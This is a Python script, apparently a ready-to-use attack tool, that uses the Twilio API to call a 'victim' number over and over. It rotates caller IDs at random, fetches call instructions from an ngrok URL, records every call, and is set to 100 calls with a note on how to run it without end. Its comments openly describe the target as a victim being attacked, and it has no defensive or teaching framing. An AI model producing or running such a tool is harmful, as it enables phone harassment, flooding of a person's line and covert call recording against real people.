# This script initiates the Twilio calls. You can modify this script to tell Twilio how often to call,
# from what numbers to call from, what your victim's phone number is, and any other commands that the
# Twilio API supports.

from subprocess import call
import time
import sys
from random import randint
from twilio.rest import Client

# This is the list of numbers you have bought from Twilio (or have verified with Twilio)
numberList = [ \
"+12223334444", \
"+13334445555", \
"+16667778888" ]

# Your victim's phone number
victim        = "+19990001111"

# Your account SID (can be found from Twilio website)
account_sid   = ""

# Your account token (can be found from Twilio website)
auth_token    = ""

# The URL that ngrok gives you
commandURL    = "http://0bbe0004.ngrok.io"

# How many seconds to space each phone call. Will wait this amount of time before calling again
sleepInterval = 30

# How many phone calls total to make
totalCalls = 100

def main():

    # Initialize the client object
    client = Client(account_sid, auth_token)    
    
    callNum = 1                                 # Keep track of the number of calls made
    
    # Loop infinitely
    while 1:
        i = randint(0, len(numberList) - 1)     # Select a random number from numberList

        print("Call number: {}".format(callNum) )
        print("\tAttacking: {}".format(victim) )
        print("\tUsing number: {}".format(numberList[i]) )
        print

        # The recording of this call will be saved to your account on Twilio
        call = client.api.account.calls\
        .create(to=victim,
              from_=numberList[i],
              url=commandURL,
              record=True,
              )

        print("\t{}".format(call.sid) )

        callNum += 1
        time.sleep(sleepInterval)                           # Space out the calls
        
        # Delete this if block if you want the program to run forever (until you hit Ctrl-C)
        if ( callNum > totalCalls ):
            break
        
    return
if __name__ == "__main__":
    main()
